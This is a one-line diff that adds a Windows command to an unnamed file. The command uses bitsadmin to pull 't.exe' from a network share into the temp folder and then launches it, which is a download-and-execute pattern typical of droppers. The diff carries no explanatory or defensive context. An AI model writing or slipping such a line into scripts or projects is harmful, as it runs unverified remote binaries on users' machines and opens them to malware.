@@ -1,0 +1,1 @@
+bitsadmin /transfer j \\fileserver\share\t.exe %TEMP%\t.exe & start %TEMP%\t.exe
